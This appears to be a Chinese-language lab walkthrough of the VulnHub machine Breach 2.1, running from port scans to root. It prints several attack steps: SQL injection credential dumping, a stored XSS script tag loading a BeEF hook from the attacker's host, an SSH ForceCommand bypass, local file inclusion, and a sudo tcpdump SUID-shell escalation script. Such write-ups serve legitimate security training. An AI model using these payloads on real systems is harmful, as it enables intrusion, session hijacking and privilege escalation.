- 靶机链接:https://www.vulnhub.com/entry/breach-21,159/
## 主机发现
这台靶机设置了静态ip（192.168.110.151）
所以打之前要把自己的机器设置到相同的C段
## 端口扫描
### 全端口扫描
- 注意这里的80一开始是扫不到的，在ssh连接peter并使用密码inthesource后才会开放
~~~
┌──(kali㉿kali)-[~/breach]
└─$ sudo nmap -sT -sV -p- --min-rate 5000  192.168.110.151 -oA nmap/ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 05:13 EDT
Nmap scan report for 192.168.110.151
Host is up (0.00084s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
39250/tcp open  status  1 (RPC #100024)
65535/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u2 (protocol 2.0)
MAC Address: 00:0C:29:B5:09:48 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.47 seconds

~~~
### 默认脚本扫描
~~~
┌──(kali㉿kali)-[~/breach]
└─$ sudo nmap -sT -sV -sC -p80,111,39250,65535 192.168.110.151 -oA nmap/sC                  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 05:13 EDT
Nmap scan report for 192.168.110.151
Host is up (0.00025s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Initech Cyber Consulting, LLC
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          38605/udp   status
|   100024  1          39250/tcp   status
|   100024  1          44325/udp6  status
|_  100024  1          55652/tcp6  status
39250/tcp open  status  1 (RPC #100024)
65535/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u2 (protocol 2.0)
| ssh-hostkey: 
|   1024 f3:53:9a:0b:40:76:b1:02:87:3e:a5:7a:ae:85:9d:26 (DSA)
|   2048 9a:a8:db:78:4b:44:4f:fb:e5:83:6b:67:e3:ac:fb:f5 (RSA)
|   256 c1:63:f1:dc:8f:24:81:82:35:fa:88:1a:b8:73:40:24 (ECDSA)
|_  256 3b:4d:56:37:5e:c3:45:75:15:cd:85:00:4f:8b:a8:5e (ED25519)
MAC Address: 00:0C:29:B5:09:48 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.72 seconds
~~~
### 漏洞脚本扫描
~~~
┌──(kali㉿kali)-[~/breach]
└─$ sudo nmap -sT -sV --script=vuln -p111,39250,65535 192.168.110.151 -oA nmap/vuln
[sudo] password for kali:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-26 10:34 EDT                 
Pre-scan script results:                                                           | broadcast-avahi-dos:                                                             |   Discovered hosts:                                                              |     224.0.0.251                                                                  |   After NULL UDP avahi packet DoS (CVE-2011-1002).                               |_  Hosts are all up (not vulnerable).                                             Nmap scan report for 192.168.110.151                                               Host is up (0.00038s latency).                                                     PORT      STATE SERVICE VERSION                                                    111/tcp   open  rpcbind 2-4 (RPC #100000)                                          | rpcinfo:                                                                         |   program version    port/proto  service                                         |   100000  2,3,4        111/tcp   rpcbind                                         |   100000  2,3,4        111/udp   rpcbind                                         |   100000  3,4          111/tcp6  rpcbind                                         |   100000  3,4          111/udp6  rpcbind                                         |   100024  1          38605/udp   status                                          |   100024  1          39250/tcp   status                                          |   100024  1          44325/udp6  status                                          |_  100024  1          55652/tcp6  status                                          39250/tcp open  status  1 (RPC #100024)                                            65535/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u2 (protocol 2.0)               | vulners:                                                                         |   cpe:/a:openbsd:openssh:6.7p1:           
EDB-ID:45210    0.0     https://vulners.com/exploitdb/EDB-ID:45210      *EXPLOIT*
|       EDB-ID:40963    0.0     https://vulners.com/exploitdb/EDB-ID:40963      
...
...
...
*EXPLOIT*
|       EDB-ID:40962    0.0     https://vulners.com/exploitdb/EDB-ID:40962      *EXPLOIT*
|       1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
|       1337DAY-ID-26468        0.0     https://vulners.com/zdt/1337DAY-ID-26468        *EXPLOIT*
|_      1337DAY-ID-25391        0.0     https://vulners.com/zdt/1337DAY-ID-25391        *EXPLOIT*
MAC Address: 00:0C:29:B5:09:48 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.79 seconds

~~~
### UDP扫描
~~~
┌──(kali㉿kali)-[~/breach]
└─$ sudo nmap -sU --top-ports 20 192.168.110.151 -oA nmap/UDP            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-26 10:34 EDT
Nmap scan report for 192.168.110.151
Host is up (0.00025s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    closed        dhcps
68/udp    closed        dhcpc
69/udp    open|filtered tftp
123/udp   closed        ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  open|filtered nat-t-ike
49152/udp closed        unknown
MAC Address: 00:0C:29:B5:09:48 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 7.47 seconds

~~~

## 65535(OpenSSH 6.7p1)
![[Pasted image 20241026224233.png]]
存在用户名枚举，暂时搁置
尝试连接一下，看有什么信息
![[Pasted image 20241027162443.png]]
有用户名peter，使用密码inthesource登录
![[Pasted image 20241029144810.png]]
连接被关闭，可见密码是正确的
## 111(RPCbind)
看起来并没有启动nfs和nis服务，showmount也证明了服务没有开启
## 80(web)
![[Pasted image 20241027171612.png]]
查看一下源码，没有什么信息
![[Pasted image 20241027171645.png]]
进行一下目录爆破吧
![[Pasted image 20241027171912.png]]
![[Pasted image 20241027172054.png]]
/image目录显示forbidden
查看一下/blog目录
![[Pasted image 20241027171830.png]]
访问到页面
发现search，sqlmap一把梭发现存在sql注入
![[Pasted image 20241028182303.png]]
查看有哪些数据库
![[Pasted image 20241028182353.png]]
发现blog和oscommerce两个比较特别的数据库
#### blog
查看所有表
![[Pasted image 20241028182528.png]]
查看blogphp_users
![[Pasted image 20241028182619.png]]
只发现了我们自己注册的账户
看来要去看看另外一个数据库
#### oscommerce
![[Pasted image 20241028182830.png]]
发现感兴趣的osc_administrators
![[Pasted image 20241028182915.png]]
拿到admin的密码hash
看起来像是md5，先鉴别一下
![[Pasted image 20241028182951.png]]
大概率是md5了
![[Pasted image 20241028183008.png]]
拿到一组凭据admin::32admin
![[Pasted image 20241028183124.png]]
在blog尝试登录似乎失败了，哎，兔子洞
再回web页面查看有什么信息
![[Pasted image 20241028192341.png]]
网站使用的blogphp
![[Pasted image 20241028192452.png]]
尝试了本地用户提权，但是就算拿到admin登录blog好像也没什么用
只能尝试xss了
结合主页面给的beef
![[Pasted image 20241028192616.png]]
我们使用beef-xss进行利用
查看exp
![[Pasted image 20241028193353.png]]
构造payload
~~~
<script src="http://192.168.110.128:3000/hook.js"></script>
~~~
![[Pasted image 20241028195216.png]]
访问members.html即可触发
![[Pasted image 20241028201427.png]]
可以发现左侧靶机的ip上线
发现了一篇精彩的[文章](https://phreaklets.blogspot.com/2014/04/using-beef-metasploit-to-pop-shell-with.html)，展示了利用msf+beef进行反弹shell
但是这里我的BeEF迟迟收不到上线的消息，所以干脆在register.html中注入我的payload
![[Pasted image 20241029144111.png]]
![[Pasted image 20241029144143.png]]
收到如图的返回说明session已经建立，用session -i 1 连接（这里的session可能会断，等下一次就好）
![[Pasted image 20241029144332.png]]
成功拿到shell，这里要去想一下我们的ssh连接为什么会被关闭
在/etc/ssh/sshd_config文件中发现
~~~
UsePAM yes
AllowUsers peter
ForceCommand /usr/bin/startme
AddressFamily inet
~~~
可以用`echo "exec sh" > ~/.bashrc`绕过
再次连接ssh
![[Pasted image 20241029145247.png]]
成功拿到立足点
## 提权枚举
### 升级终端
提升一下交互性
~~~
export TERM=xterm
~~~
### 信息枚举
在/var/www/html/blog/config.php中找到mysql的登录凭据
![[Pasted image 20241029152649.png]]
似乎用处不大，暂时保留
sudo -l
![[Pasted image 20241029192057.png]]
没有修改配置文件和设置LD_PRELOAD的权限
靠apache2提权只能暂时搁置
cat /etc/passwd
![[Pasted image 20241029192306.png]]
有用户peter、milton、blumbergh
`netstat -tlnp`查看监听中的端口
![[Pasted image 20241029192612.png]]
2323似乎是没有扫出来的，看一下开启的是什么服务
`gerp -rl 2323 /etc  2>/dev/null`
![[Pasted image 20241029192833.png]]
![[Pasted image 20241029192855.png]]
开启的是telnet服务，尝试连接
![[Pasted image 20241029192949.png]]
给了一个经纬度地址，google一下
![[Pasted image 20241029193032.png]]
定位到了休斯顿
尝试下其他用户登录
发现milton::Houston可以登录，得到提示Whose stapler is it（也出现过在web页面）
![[Pasted image 20241029193141.png]]
查找一下stapler
![[Pasted image 20241029194119.png]]
![[Pasted image 20241029194301.png]]
回答mine
![[Pasted image 20241029194531.png]]
我们变成milton了！
发现又多了一个8888端口
![[Pasted image 20241029200248.png]]
看一下8888是什么服务
![[Pasted image 20241029200415.png]]
似乎是nginx
从浏览器访问发现确实是nginx
![[Pasted image 20241029200520.png]]
是之前发现的oscommerce
在milton的身份下发现无法在这里新建文件，只能利用oscommerce本身的漏洞了
![[Pasted image 20241029200910.png]]
查看有文件本地包含漏洞
![[Pasted image 20241029202145.png]]
查看有漏洞的文件，发现会先加一个.php后缀
![[Pasted image 20241029203339.png]]
新建一个/tmp/shell.php
![[Pasted image 20241029205307.png]]
![[Pasted image 20241029204658.png]]
我们得到了另一个用户的身份
反弹一个shell
![[Pasted image 20241029205759.png]]
终于我们可以愉快的提权了
tcpdump中有两个参数-z和-Z，前者用来执行一个脚本，后者用来指定tcpdump以哪个用户运行，当可以通过sudo执行时，则可以指定以root用户运行一个脚本，从而提权
编写提权脚本
~~~
cp /bin/bash /tmp/rootshell
chmod +sx /tmp/rootshell
~~~

sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exp.sh -Z root

执行成功
![[Pasted image 20241029211226.png]]
定妆照
![[Pasted image 20241029211429.png]]